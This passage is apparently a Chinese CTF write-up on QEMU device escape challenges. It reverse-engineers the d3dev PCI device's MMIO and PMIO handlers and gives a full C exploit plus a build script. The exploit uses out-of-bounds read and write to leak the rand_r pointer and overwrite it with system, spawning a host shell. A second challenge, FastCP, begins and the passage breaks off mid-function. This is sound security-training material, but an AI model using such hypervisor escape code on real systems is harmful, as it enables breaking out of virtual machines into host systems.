<h3 id="分析">1. 分析</h3>
<div class="sourceCode" id="cb1"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="co">#!/bin/sh</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a><span class="ex">./qemu-system-x86_64</span> <span class="kw">\</span></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="ex">-L</span> pc-bios/ <span class="kw">\</span></span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a><span class="ex">-m</span> 128M <span class="kw">\</span></span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a><span class="ex">-kernel</span> vmlinuz <span class="kw">\</span></span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true"></a><span class="ex">-initrd</span> rootfs.img <span class="kw">\</span></span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true"></a><span class="ex">-smp</span> 1 <span class="kw">\</span></span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true"></a><span class="ex">-append</span> <span class="st">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet&quot;</span> <span class="kw">\</span></span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true"></a><span class="ex">-device</span> d3dev <span class="kw">\</span></span>
<span id="cb1-10"><a href="#cb1-10" aria-hidden="true"></a><span class="ex">-netdev</span> user,id=t0, -device e1000,netdev=t0,id=nic0 <span class="kw">\</span></span>
<span id="cb1-11"><a href="#cb1-11" aria-hidden="true"></a><span class="ex">-nographic</span> <span class="kw">\</span></span>
<span id="cb1-12"><a href="#cb1-12" aria-hidden="true"></a><span class="ex">-monitor</span> /dev/null</span></code></pre></div>
<p>启动脚本中出现<code>-device d3dev</code></p>
<p>使用IDA pro反汇编qemu，查找d3dev</p>
<p>在<code>d3dev_class_init()</code>函数中找到注册了PCI设备d3dev</p>
<p>其中</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a>  LODWORD(v2[<span class="dv">2</span>].object_cast_cache[<span class="dv">0</span>]) = <span class="bn">0x11E82333</span>;</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a>  BYTE4(v2[<span class="dv">2</span>].object_cast_cache[<span class="dv">0</span>]) = <span class="bn">0x10</span>;</span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true"></a>  HIWORD(v2[<span class="dv">2</span>].object_cast_cache[<span class="dv">0</span>]) = <span class="bn">0xFF</span>;</span></code></pre></div>
<p>可以知道d3dev设备的Device id（0x11E8）和Vendor id（0x2333）</p>
<p>之后在<code>pci_d3dev_realize()</code>函数中可以找到该设备MMIO和PMIO的读写操作函数，且MMIO的内存大小为0x800，PMIO的内存大小为0x20，在读写的时候如果访问的地址在其范围内则会调用相关的读写函数</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="dt">void</span> __fastcall pci_d3dev_realize(PCIDevice_0 *pdev, Error_0 **errp)</span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a>{</span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true"></a>  memory_region_init_io(</span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true"></a>    (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>],</span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true"></a>    &amp;pdev-&gt;qdev.parent_obj,</span>
<span id="cb3-6"><a href="#cb3-6" aria-hidden="true"></a>    &amp;d3dev_mmio_ops,</span>
<span id="cb3-7"><a href="#cb3-7" aria-hidden="true"></a>    pdev,</span>
<span id="cb3-8"><a href="#cb3-8" aria-hidden="true"></a>    <span class="st">&quot;d3dev-mmio&quot;</span>,</span>
<span id="cb3-9"><a href="#cb3-9" aria-hidden="true"></a>    <span class="bn">0x800</span><span class="bu">uLL</span>);</span>
<span id="cb3-10"><a href="#cb3-10" aria-hidden="true"></a>  pci_register_bar(pdev, <span class="dv">0</span>, <span class="dv">0</span>, (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>]);</span>
<span id="cb3-11"><a href="#cb3-11" aria-hidden="true"></a>  memory_region_init_io(</span>
<span id="cb3-12"><a href="#cb3-12" aria-hidden="true"></a>    (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>].name[<span class="dv">56</span>],</span>
<span id="cb3-13"><a href="#cb3-13" aria-hidden="true"></a>    &amp;pdev-&gt;qdev.parent_obj,</span>
<span id="cb3-14"><a href="#cb3-14" aria-hidden="true"></a>    &amp;d3dev_pmio_ops,</span>
<span id="cb3-15"><a href="#cb3-15" aria-hidden="true"></a>    pdev,</span>
<span id="cb3-16"><a href="#cb3-16" aria-hidden="true"></a>    <span class="st">&quot;d3dev-pmio&quot;</span>,</span>
<span id="cb3-17"><a href="#cb3-17" aria-hidden="true"></a>    <span class="bn">0x20</span><span class="bu">uLL</span>);</span>
<span id="cb3-18"><a href="#cb3-18" aria-hidden="true"></a>  pci_register_bar(pdev, <span class="dv">1</span>, <span class="dv">1</span><span class="bu">u</span>, (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>].name[<span class="dv">56</span>]);</span>
<span id="cb3-19"><a href="#cb3-19" aria-hidden="true"></a>}</span></code></pre></div>
<p>之后查看mmio和pmio的读写函数，但是在详细分析之前修改这些函数的第一个参数</p>
<p>第一个参数默认为<code>void *opaque</code></p>
<p>但是明显可以看到他是一个指向自定义结构体的指针，我们可以：</p>
<blockquote>
<p>选中opaque -&gt; 右键Convert to struct* -&gt; d3devState</p>
</blockquote>
<p>具体的结构体名词可以在<code>pci_d3dev_realize()</code>函数中查看汇编查看</p>
<p><img src="https://pic1.imgdb.cn/item/6357cdda16f2c2beb1c3ed00.png" /></p>
<p>可以在IDA中详细查看这个结构体的定义</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="bn">00000000</span> d3devState struc ; (<span class="kw">sizeof</span>=<span class="bn">0x1300</span>, align=<span class="bn">0x10</span>, copyof_4545)</span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true"></a><span class="bn">00000000</span> pdev PCIDevice_0 ?</span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true"></a><span class="fl">000008E0</span> mmio MemoryRegion_0 ?</span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true"></a><span class="bn">00000</span><span class="er">9D0</span> pmio MemoryRegion_0 ?</span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true"></a><span class="bn">00000</span><span class="er">AC0</span> memory_mode dd ?</span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true"></a><span class="bn">00000</span><span class="er">AC4</span> seek dd ?</span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true"></a><span class="bn">00000</span><span class="er">AC8</span> init_flag dd ?</span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true"></a><span class="bn">00000</span><span class="er">ACC</span> mmio_read_part dd ?</span>
<span id="cb4-9"><a href="#cb4-9" aria-hidden="true"></a><span class="bn">00000</span><span class="er">AD0</span> mmio_write_part dd ?</span>
<span id="cb4-10"><a href="#cb4-10" aria-hidden="true"></a><span class="bn">00000</span><span class="er">AD4</span> r_seed dd ?</span>
<span id="cb4-11"><a href="#cb4-11" aria-hidden="true"></a><span class="bn">00000</span><span class="er">AD8</span> blocks dq <span class="dv">257</span> dup(?)</span>
<span id="cb4-12"><a href="#cb4-12" aria-hidden="true"></a><span class="fl">000012E0</span> key dd <span class="dv">4</span> dup(?)</span>
<span id="cb4-13"><a href="#cb4-13" aria-hidden="true"></a><span class="bn">000012</span><span class="er">F0</span> rand_r dq ?                             ; offset</span>
<span id="cb4-14"><a href="#cb4-14" aria-hidden="true"></a><span class="bn">000012</span><span class="er">F8</span> db ? ; undefined</span>
<span id="cb4-15"><a href="#cb4-15" aria-hidden="true"></a><span class="bn">000012</span><span class="er">F9</span> db ? ; undefined</span>
<span id="cb4-16"><a href="#cb4-16" aria-hidden="true"></a><span class="bn">000012</span><span class="er">FA</span> db ? ; undefined</span>
<span id="cb4-17"><a href="#cb4-17" aria-hidden="true"></a><span class="bn">000012</span><span class="er">FB</span> db ? ; undefined</span>
<span id="cb4-18"><a href="#cb4-18" aria-hidden="true"></a><span class="bn">000012</span><span class="er">FC</span> db ? ; undefined</span>
<span id="cb4-19"><a href="#cb4-19" aria-hidden="true"></a><span class="bn">000012</span><span class="er">FD</span> db ? ; undefined</span>
<span id="cb4-20"><a href="#cb4-20" aria-hidden="true"></a><span class="bn">000012</span><span class="er">FE</span> db ? ; undefined</span>
<span id="cb4-21"><a href="#cb4-21" aria-hidden="true"></a><span class="bn">000012</span><span class="er">FF</span> db ? ; undefined</span>
<span id="cb4-22"><a href="#cb4-22" aria-hidden="true"></a><span class="bn">00001300</span> d3devState ends</span>
<span id="cb4-23"><a href="#cb4-23" aria-hidden="true"></a><span class="bn">00001300</span></span></code></pre></div>
<p>之后分析mmio_read和mmio_write的操作</p>
<p>根据IDA可以看出，<code>d3dev_mmio_read()</code>该函数首先通过<code>seek</code>和<code>addr</code>来从<code>opaque-&gt;blocks</code>中取出<code>block</code>，然后经过<code>tea</code>编码后，返回给用户。</p>
<p>从上面数据结构中，可知<code>block</code>的长度为<code>0x100</code>，而我们这里传入的<code>addr</code>并没有检查范围，所以可以超过<code>0x100</code>，从而发生越界读取。而这里越界之后，可以读取<code>key</code>和<code>rand_r</code>的值。</p>
<p>接着看<code>d3dev_write</code>:该函数主要是将传入的<code>val</code>赋值给<code>opaque-&gt;blocks[offset]</code>。如果是奇数次，则直接赋值。如果是偶数次则先加密再赋值。这里也没有对<code>addr</code>进行范围检查，可以越界写。</p>
<p>之后<code>d3dev_pmio_read()</code></p>
<p><img src="https://pic1.imgdb.cn/item/6357d1ad16f2c2beb1c9063b.png" /></p>
<p><code>d3dev_pmio_read</code>基本功能就是，通过输入不同的<code>addr</code>，会进入不同<code>switch-case</code>。这里就会将<code>opaque-&gt;key</code>的四个值进行返回。</p>
<p><code>d3dev_pmio_write</code>会去调用<code>rand_r</code>函数指针，这个指针存储的是<code>rand</code>函数地址。</p>
<p><img src="https://pic1.imgdb.cn/item/6357d23b16f2c2beb1c9c6f4.png" /></p>
<h3 id="漏洞利用">2. 漏洞利用</h3>
<p>利用mmio_read的越界读获得key值和rand_r的值，其中rand_r保存的rand函数的地址，实现泄露地址，我们通过越界读泄漏该地址，那么就可以得到<code>qemu</code>的基址。</p>
<p>得到了<code>qemu</code>基址后，我们就可以计算得到<code>system</code>函数的地址。</p>
<p>然后通过越界写，修改<code>rand_r</code>存储的函数指针为<code>system</code>。然后去触发<code>system</code>函数。</p>
<p>在<code>d3dev_mmio_write</code>函数中的越界写可以直接修改结构体中的数据，两个分支一个可以直接覆写4字节，另一个经过加密后可以覆写8字节；<code>d3dev_mmio_read</code>读取的数据要经过随机数key和key1进行加密，可以通过越界写将两处key内存覆盖为0或在<code>d3dev_pmio_write</code>函数中将两处key都设置为0</p>
<p>这里想实现<code>getshell</code>，可以去执行<code>rand_r</code>函数，并设置参数为<code>sh</code>。</p>
<p>查看mmio和pmio基地址的方法：</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="ex">/sys/devices</span>/pci0000:<span class="ex">00</span>/0000:<span class="ex">00</span>:03.0 # cat resource</span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a><span class="ex">0x00000000febf1000</span> 0x00000000febf17ff 0x0000000000040200</span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a><span class="ex">0x000000000000c040</span> 0x000000000000c05f 0x0000000000040101</span></code></pre></div>
<p>其中0x00000000febf1000就是mmio地址；0x000000000000c040就是pmio地址</p>
<h3 id="exploit">3. Exploit</h3>
<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="pp">#include</span><span class="im">&lt;stdint.h&gt;</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="pp">#include</span><span class="im">&lt;fcntl.h&gt;</span></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="pp">#include</span><span class="im">&lt;sys/mman.h&gt;</span></span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a><span class="pp">#include</span><span class="im">&lt;sys/io.h&gt;</span></span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true"></a><span class="pp">#include</span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true"></a><span class="pp">#include</span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true"></a></span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true"></a><span class="dt">unsigned</span> <span class="dt">char</span>* mmio_mem;</span>
<span id="cb6-9"><a href="#cb6-9" aria-hidden="true"></a></span>
<span id="cb6-10"><a href="#cb6-10" aria-hidden="true"></a><span class="dt">void</span> Err(<span class="dt">char</span> * err){</span>
<span id="cb6-11"><a href="#cb6-11" aria-hidden="true"></a>    printf(<span class="st">&quot;Error: %s</span><span class="sc">\n</span><span class="st">&quot;</span>,err);</span>
<span id="cb6-12"><a href="#cb6-12" aria-hidden="true"></a>    exit(-<span class="dv">1</span>);</span>
<span id="cb6-13"><a href="#cb6-13" aria-hidden="true"></a>}</span>
<span id="cb6-14"><a href="#cb6-14" aria-hidden="true"></a></span>
<span id="cb6-15"><a href="#cb6-15" aria-hidden="true"></a><span class="dt">void</span> init_pmio(){</span>
<span id="cb6-16"><a href="#cb6-16" aria-hidden="true"></a>    iopl(<span class="dv">3</span>); <span class="co">// 0x3ff 以上端口全部开启访问</span></span>
<span id="cb6-17"><a href="#cb6-17" aria-hidden="true"></a>}</span>
<span id="cb6-18"><a href="#cb6-18" aria-hidden="true"></a></span>
<span id="cb6-19"><a href="#cb6-19" aria-hidden="true"></a><span class="dt">void</span> init_mmio(){</span>
<span id="cb6-20"><a href="#cb6-20" aria-hidden="true"></a>    <span class="dt">int</span> mmio_fd = open(<span class="st">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>,O_RDWR|O_SYNC);</span>
<span id="cb6-21"><a href="#cb6-21" aria-hidden="true"></a>    mmio_mem = mmap(<span class="dv">0</span>,<span class="bn">0x1000</span>,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,<span class="dv">0</span>);</span>
<span id="cb6-22"><a href="#cb6-22" aria-hidden="true"></a>}</span>
<span id="cb6-23"><a href="#cb6-23" aria-hidden="true"></a></span>
<span id="cb6-24"><a href="#cb6-24" aria-hidden="true"></a><span class="dt">void</span> mmio_write(<span class="dt">uint32_t</span> addr,<span class="dt">uint32_t</span> value){</span>
<span id="cb6-25"><a href="#cb6-25" aria-hidden="true"></a>    *(<span class="dt">uint32_t</span>*)(mmio_mem+addr) = value;</span>
<span id="cb6-26"><a href="#cb6-26" aria-hidden="true"></a>}</span>
<span id="cb6-27"><a href="#cb6-27" aria-hidden="true"></a></span>
<span id="cb6-28"><a href="#cb6-28" aria-hidden="true"></a><span class="dt">uint64_t</span> mmio_read(<span class="dt">uint64_t</span> addr){</span>
<span id="cb6-29"><a href="#cb6-29" aria-hidden="true"></a>    <span class="cf">return</span> *(<span class="dt">uint64_t</span>*)(mmio_mem+addr); </span>
<span id="cb6-30"><a href="#cb6-30" aria-hidden="true"></a>}</span>
<span id="cb6-31"><a href="#cb6-31" aria-hidden="true"></a></span>
<span id="cb6-32"><a href="#cb6-32" aria-hidden="true"></a><span class="dt">uint32_t</span> pmio_base = <span class="bn">0xc040</span>;</span>
<span id="cb6-33"><a href="#cb6-33" aria-hidden="true"></a></span>
<span id="cb6-34"><a href="#cb6-34" aria-hidden="true"></a><span class="dt">void</span> pmio_write(<span class="dt">uint32_t</span> addr,<span class="dt">uint32_t</span> value){</span>
<span id="cb6-35"><a href="#cb6-35" aria-hidden="true"></a>    outl(value,pmio_base+addr);</span>
<span id="cb6-36"><a href="#cb6-36" aria-hidden="true"></a>}</span>
<span id="cb6-37"><a href="#cb6-37" aria-hidden="true"></a></span>
<span id="cb6-38"><a href="#cb6-38" aria-hidden="true"></a><span class="dt">uint64_t</span> pmio_read(<span class="dt">uint32_t</span> addr){</span>
<span id="cb6-39"><a href="#cb6-39" aria-hidden="true"></a>    <span class="cf">return</span> (<span class="dt">uint64_t</span>)inl(pmio_base+addr);</span>
<span id="cb6-40"><a href="#cb6-40" aria-hidden="true"></a>}</span>
<span id="cb6-41"><a href="#cb6-41" aria-hidden="true"></a></span>
<span id="cb6-42"><a href="#cb6-42" aria-hidden="true"></a><span class="dt">uint64_t</span> encode(<span class="dt">uint32_t</span> high, <span class="dt">uint32_t</span> low) {</span>
<span id="cb6-43"><a href="#cb6-43" aria-hidden="true"></a></span>
<span id="cb6-44"><a href="#cb6-44" aria-hidden="true"></a>    <span class="dt">uint32_t</span> addr = <span class="bn">0xC6EF3720</span>;</span>
<span id="cb6-45"><a href="#cb6-45" aria-hidden="true"></a></span>
<span id="cb6-46"><a href="#cb6-46" aria-hidden="true"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; <span class="dv">32</span>; ++i) {</span>
<span id="cb6-47"><a href="#cb6-47" aria-hidden="true"></a>        high = high - ((low + addr) ^ (low &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * low));</span>
<span id="cb6-48"><a href="#cb6-48" aria-hidden="true"></a>        low = low - (((high + addr) ^ (high &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * high)));</span>
<span id="cb6-49"><a href="#cb6-49" aria-hidden="true"></a>        addr += <span class="bn">0x61C88647</span>;</span>
<span id="cb6-50"><a href="#cb6-50" aria-hidden="true"></a>    }</span>
<span id="cb6-51"><a href="#cb6-51" aria-hidden="true"></a></span>
<span id="cb6-52"><a href="#cb6-52" aria-hidden="true"></a>    <span class="cf">return</span> (<span class="dt">uint64_t</span>)high * <span class="bn">0x100000000</span> + low;</span>
<span id="cb6-53"><a href="#cb6-53" aria-hidden="true"></a>}</span>
<span id="cb6-54"><a href="#cb6-54" aria-hidden="true"></a></span>
<span id="cb6-55"><a href="#cb6-55" aria-hidden="true"></a><span class="dt">uint64_t</span> decode(<span class="dt">uint32_t</span> high, <span class="dt">uint32_t</span> low) {</span>
<span id="cb6-56"><a href="#cb6-56" aria-hidden="true"></a></span>
<span id="cb6-57"><a href="#cb6-57" aria-hidden="true"></a>    <span class="dt">uint32_t</span> addr = <span class="bn">0x0</span>;</span>
<span id="cb6-58"><a href="#cb6-58" aria-hidden="true"></a></span>
<span id="cb6-59"><a href="#cb6-59" aria-hidden="true"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; <span class="dv">32</span>; ++i) {</span>
<span id="cb6-60"><a href="#cb6-60" aria-hidden="true"></a>        addr -= <span class="bn">0x61C88647</span>;</span>
<span id="cb6-61"><a href="#cb6-61" aria-hidden="true"></a>        low += (((high + addr) ^ (high &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * high)));</span>
<span id="cb6-62"><a href="#cb6-62" aria-hidden="true"></a>        high += ((low + addr) ^ (low &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * low));</span>
<span id="cb6-63"><a href="#cb6-63" aria-hidden="true"></a>    }</span>
<span id="cb6-64"><a href="#cb6-64" aria-hidden="true"></a></span>
<span id="cb6-65"><a href="#cb6-65" aria-hidden="true"></a>    <span class="cf">return</span> (<span class="dt">uint64_t</span>)high * <span class="bn">0x100000000</span> + low;</span>
<span id="cb6-66"><a href="#cb6-66" aria-hidden="true"></a>}</span>
<span id="cb6-67"><a href="#cb6-67" aria-hidden="true"></a></span>
<span id="cb6-68"><a href="#cb6-68" aria-hidden="true"></a><span class="dt">int</span> main(){</span>
<span id="cb6-69"><a href="#cb6-69" aria-hidden="true"></a>    printf(<span class="st">&quot;init pci and mmio:</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
<span id="cb6-70"><a href="#cb6-70" aria-hidden="true"></a>    init_pmio();</span>
<span id="cb6-71"><a href="#cb6-71" aria-hidden="true"></a>    init_mmio();</span>
<span id="cb6-72"><a href="#cb6-72" aria-hidden="true"></a></span>
<span id="cb6-73"><a href="#cb6-73" aria-hidden="true"></a>    printf(<span class="st">&quot;set seek = 0x100</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
<span id="cb6-74"><a href="#cb6-74" aria-hidden="true"></a>    pmio_write(<span class="bn">0x8</span>,<span class="bn">0x100</span>);</span>
<span id="cb6-75"><a href="#cb6-75" aria-hidden="true"></a>    printf(<span class="st">&quot;set key = 0x0</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
<span id="cb6-76"><a href="#cb6-76" aria-hidden="true"></a>    pmio_write(<span class="bn">0x4</span>,<span class="dv">0</span>);</span>
<span id="cb6-77"><a href="#cb6-77" aria-hidden="true"></a></span>
<span id="cb6-78"><a href="#cb6-78" aria-hidden="true"></a></span>
<span id="cb6-79"><a href="#cb6-79" aria-hidden="true"></a>    printf(<span class="st">&quot;oob read rand_r</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
<span id="cb6-80"><a href="#cb6-80" aria-hidden="true"></a>    <span class="dt">uint64_t</span> value = mmio_read(<span class="dv">3</span>*<span class="dv">8</span>);</span>
<span id="cb6-81"><a href="#cb6-81" aria-hidden="true"></a>    printf(<span class="st">&quot;%lx</span><span class="sc">\n</span><span class="st">&quot;</span>,value);</span>
<span id="cb6-82"><a href="#cb6-82" aria-hidden="true"></a></span>
<span id="cb6-83"><a href="#cb6-83" aria-hidden="true"></a>    <span class="dt">uint64_t</span> rand_r = decode(value&gt;&gt;<span class="dv">32</span>, value&amp;<span class="bn">0xffffffff</span>);</span>
<span id="cb6-84"><a href="#cb6-84" aria-hidden="true"></a>    printf(<span class="st">&quot;%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, rand_r);</span>
<span id="cb6-85"><a href="#cb6-85" aria-hidden="true"></a></span>
<span id="cb6-86"><a href="#cb6-86" aria-hidden="true"></a>    <span class="dt">uint64_t</span> system_addr = rand_r+<span class="bn">0xa560</span>;</span>
<span id="cb6-87"><a href="#cb6-87" aria-hidden="true"></a>    printf(<span class="st">&quot;system_addr ==&gt; %lx</span><span class="sc">\n</span><span class="st">&quot;</span>, system_addr);</span>
<span id="cb6-88"><a href="#cb6-88" aria-hidden="true"></a></span>
<span id="cb6-89"><a href="#cb6-89" aria-hidden="true"></a>    <span class="dt">uint64_t</span> encode_system = encode(system_addr&gt;&gt;<span class="dv">32</span>, system_addr&amp;<span class="bn">0xffffffff</span>);</span>
<span id="cb6-90"><a href="#cb6-90" aria-hidden="true"></a>    printf(<span class="st">&quot;encode_system ==&gt; %lx</span><span class="sc">\n</span><span class="st">&quot;</span>, encode_system);</span>
<span id="cb6-91"><a href="#cb6-91" aria-hidden="true"></a></span>
<span id="cb6-92"><a href="#cb6-92" aria-hidden="true"></a>    <span class="dt">uint32_t</span> es_low  = encode_system % <span class="bn">0x100000000</span>;</span>
<span id="cb6-93"><a href="#cb6-93" aria-hidden="true"></a>    <span class="dt">uint32_t</span> es_high = encode_system / <span class="bn">0x100000000</span>;</span>
<span id="cb6-94"><a href="#cb6-94" aria-hidden="true"></a></span>
<span id="cb6-95"><a href="#cb6-95" aria-hidden="true"></a>    printf(<span class="st">&quot;oob write</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
<span id="cb6-96"><a href="#cb6-96" aria-hidden="true"></a>    mmio_write(<span class="dv">3</span>*<span class="dv">8</span>, es_low);</span>
<span id="cb6-97"><a href="#cb6-97" aria-hidden="true"></a>    sleep(<span class="dv">1</span>);</span>
<span id="cb6-98"><a href="#cb6-98" aria-hidden="true"></a>    mmio_write(<span class="dv">3</span>*<span class="dv">8</span>, es_high);</span>
<span id="cb6-99"><a href="#cb6-99" aria-hidden="true"></a></span>
<span id="cb6-100"><a href="#cb6-100" aria-hidden="true"></a>    printf(<span class="st">&quot;set seek=0x0</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
<span id="cb6-101"><a href="#cb6-101" aria-hidden="true"></a>    pmio_write(<span class="bn">0x8</span>, <span class="bn">0x0</span>);</span>
<span id="cb6-102"><a href="#cb6-102" aria-hidden="true"></a></span>
<span id="cb6-103"><a href="#cb6-103" aria-hidden="true"></a></span>
<span id="cb6-104"><a href="#cb6-104" aria-hidden="true"></a>    pmio_write(<span class="bn">0x1c</span>,<span class="bn">0x6873</span>); <span class="co">// 0x6873 == &quot;sh&quot;</span></span>
<span id="cb6-105"><a href="#cb6-105" aria-hidden="true"></a></span>
<span id="cb6-106"><a href="#cb6-106" aria-hidden="true"></a>}</span></code></pre></div>
<div class="sourceCode" id="cb7"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="co">#!bash</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a><span class="fu">gcc</span> expliot.c -o expliot --static <span class="kw">&amp;&amp;\</span></span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true"></a><span class="fu">chmod</span> +x expliot <span class="kw">&amp;&amp;\</span></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true"></a><span class="fu">cp</span> ./expliot ./cpio-root/expliot <span class="kw">&amp;&amp;\</span></span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true"></a><span class="bu">cd</span> ./cpio-root <span class="kw">&amp;&amp;\</span></span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true"></a><span class="fu">find</span> . <span class="kw">|</span> <span class="fu">cpio</span> -o --format=newc <span class="op">&gt;</span> ../rootfs.img</span></code></pre></div>
<h2 id="x02-hws2021-fastcp">0x02 HWS2021 FastCP</h2>
<h3 id="分析-1">1. 分析</h3>
<pre class="bas"><code>#!/bin/sh

./qemu-system-x86_64 -initrd ./rootfs.img -nographic -kernel ./vmlinuz-5.0.5-generic -append &quot;priority=low console=ttyS0&quot; -monitor /dev/null --device FastCP
</code></pre>
<p>可以看到有设备FastCP</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a><span class="dt">void</span> __fastcall pci_FastCP_realize(PCIDevice_0 *pdev, Error_0 **errp)</span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true"></a>{</span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true"></a>  Object_0 *v2; <span class="co">// rbp</span></span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true"></a></span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true"></a>  v2 = object_dynamic_cast_assert(</span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true"></a>         &amp;pdev-&gt;qdev.parent_obj,</span>
<span id="cb9-7"><a href="#cb9-7" aria-hidden="true"></a>         <span class="st">&quot;FastCP&quot;</span>,</span>
<span id="cb9-8"><a href="#cb9-8" aria-hidden="true"></a>         <span class="st">&quot;/root/source/qemu/hw/misc/fastcp.c&quot;</span>,</span>
<span id="cb9-9"><a href="#cb9-9" aria-hidden="true"></a>         <span class="dv">258</span>,</span>
<span id="cb9-10"><a href="#cb9-10" aria-hidden="true"></a>         <span class="st">&quot;pci_FastCP_realize&quot;</span>);</span>
<span id="cb9-11"><a href="#cb9-11" aria-hidden="true"></a>  pdev-&gt;config[<span class="dv">61</span>] = <span class="dv">1</span>;</span>
<span id="cb9-12"><a href="#cb9-12" aria-hidden="true"></a>  <span class="cf">if</span> ( !msi_init(pdev, <span class="dv">0</span>, <span class="dv">1</span><span class="bu">u</span>, <span class="dv">1</span>, <span class="dv">0</span>, errp) )</span>
<span id="cb9-13"><a href="#cb9-13" aria-hidden="true"></a>  {</span>
<span id="cb9-14"><a href="#cb9-14" aria-hidden="true"></a>    timer_init_full(</span>
<span id="cb9-15"><a href="#cb9-15" aria-hidden="true"></a>      (QEMUTimer_0 *)&amp;v2[<span class="dv">166</span>].properties,</span>
<span id="cb9-16"><a href="#cb9-16" aria-hidden="true"></a>      <span class="dv">0</span><span class="bu">LL</span>,</span>
<span id="cb9-17"><a href="#cb9-17" aria-hidden="true"></a>      QEMU_CLOCK_VIRTUAL,</span>
<span id="cb9-18"><a href="#cb9-18" aria-hidden="true"></a>      (<span class="dt">int</span>)&amp;stru_F4240,</span>
<span id="cb9-19"><a href="#cb9-19" aria-hidden="true"></a>      <span class="dv">0</span>,</span>
<span id="cb9-20"><a href="#cb9-20" aria-hidden="true"></a>      fastcp_cp_timer,</span>
<span id="cb9-21"><a href="#cb9-21" aria-hidden="true"></a>      v2);</span>
<span id="cb9-22"><a href="#cb9-22" aria-hidden="true"></a>    memory_region_init_io(</span>
<span id="cb9-23"><a href="#cb9-23" aria-hidden="true"></a>      (MemoryRegion_0 *)&amp;v2[<span class="dv">57</span>].free,</span>
<span id="cb9-24"><a href="#cb9-24" aria-hidden="true"></a>      v2,</span>
<span id="cb9-25"><a href="#cb9-25" aria-hidden="true"></a>      &amp;fastcp_mmio_ops,</span>
<span id="cb9-26"><a href="#cb9-26" aria-hidden="true"></a>      v2,</span>
